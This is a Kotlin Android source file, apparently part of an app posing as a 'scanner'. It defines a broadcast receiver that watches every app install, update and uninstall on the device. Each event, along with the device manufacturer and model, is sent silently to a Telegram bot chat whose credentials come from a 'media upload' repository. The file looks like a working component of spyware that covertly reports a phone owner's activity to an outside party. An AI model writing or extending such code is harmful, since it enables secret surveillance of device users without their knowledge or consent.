package com.example.scanner

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AppInstallReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent?) {
        val action = intent?.action ?: return
        val dataString = intent.dataString ?: return
        val packageName = dataString.removePrefix("package:")
        if (packageName.isBlank() || packageName == context.packageName) return

        val repository = MediaUploadRepository(context)
        val config = repository.getTelegramConfig()
        if (config.botToken.isBlank() || config.chatId.isBlank()) return

        val telegramApi = TelegramApiService(context)
        val scope = CoroutineScope(Dispatchers.IO)

        val pm = context.packageManager
        val appName = try {
            val appInfo = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getApplicationInfo(packageName, PackageManager.ApplicationInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                pm.getApplicationInfo(packageName, 0)
            }
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) {
            packageName
        }

        val currentTime = SimpleDateFormat("dd MMM, hh:mm:ss a", Locale.getDefault()).format(Date())

        val message = when (action) {
            Intent.ACTION_PACKAGE_ADDED -> {
                val isReplacing = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)
                if (isReplacing) {
                    "🔄 <b>APP UPDATED ON DEVICE</b>\n\n" +
                            "📦 <b>App:</b> $appName\n" +
                            "🏷️ <b>Package:</b> <code>$packageName</code>\n" +
                            "🕒 <b>Time:</b> $currentTime\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                } else {
                    "📦 <b>NEW APP INSTALLED</b>\n\n" +
                            "✨ <b>App:</b> $appName\n" +
                            "🏷️ <b>Package:</b> <code>$packageName</code>\n" +
                            "🕒 <b>Time:</b> $currentTime\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                }
            }
            Intent.ACTION_PACKAGE_REMOVED -> {
                val isReplacing = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)
                if (!isReplacing) {
                    "🗑️ <b>APP UNINSTALLED</b>\n\n" +
                            "❌ <b>Package:</b> <code>$packageName</code>\n" +
                            "🕒 <b>Time:</b> $currentTime\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                } else null
            }
            else -> null
        }

        if (message != null) {
            scope.launch {
                telegramApi.sendMessage(config.botToken, config.chatId, message)
            }
        }
    }
}
